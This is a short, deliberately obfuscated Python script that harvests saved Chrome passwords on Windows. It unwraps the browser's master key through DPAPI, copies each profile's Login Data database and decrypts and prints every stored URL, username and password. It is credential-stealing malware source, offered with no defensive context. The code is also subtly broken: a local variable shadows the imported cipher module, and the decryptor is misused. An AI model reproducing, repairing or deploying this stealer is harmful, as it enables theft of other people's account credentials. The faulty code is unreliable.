import os as o, json as j, base64 as b, sqlite3 as s, shutil as sh, win32crypt as w
from cryptography.hazmat.primitives.ciphers import Cipher as C, algorithms as a, modes as m
from cryptography.hazmat.backends import default_backend as d
def g_k():
    p = o.path.expanduser("~")
    l_p = o.path.join(p, "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
    try:
        with open(l_p, "r", encoding="utf-8") as f:
            d = j.load(f)["os_crypt"]["encrypted_key"]
        d = b.b64decode(d)
        if d[:5] == b"DPAPI": d = d[5:]
        else: return None
        r = w.CryptUnprotectData(d, None, None, None, 0)[1]
        return r
    except Exception as e: return None
def d_p(c, k):
    try:
        if c.startswith(b"v10") or c.startswith(b"v11"): c = c[3:]
        else: return None
        i, e, a = c[:12], c[12:-16], c[-16:]
        c = C(a.AES(k), m.GCM(i, a), backend=d())
        return (c.decryptor().update(e) + c.decryptor().finalize()).decode("utf-8")
    except Exception as e: return None
def f_p():
    k = g_k()
    if not k: return
    p = o.path.expanduser("~")
    u_p = o.path.join(p, "AppData", "Local", "Google", "Chrome", "User Data")
    ps = [p for p in o.listdir(u_p) if o.path.isdir(o.path.join(u_p, p)) and ("Profile" in p or p == "Default")]
    for pr in ps:
        l_d = o.path.join(u_p, pr, "Login Data")
        if not o.path.exists(l_d): continue
        sh.copy2(l_d, "l.db")
        c = s.connect("l.db")
        cu = c.cursor()
        cu.execute("SELECT origin_url, username_value, password_value FROM logins")
        for l in cu.fetchall():
            u, n, e = l[0] or "(No URL)", l[1] or "(No Username)", l[2]
            if not u.strip() and not n.strip(): continue
            d = d_p(e, k)
            print(f"Url: {u}, Username: {n}, Password: {d}")
        cu.close(); c.close(); o.remove("l.db")
if __name__ == "__main__": f_p()
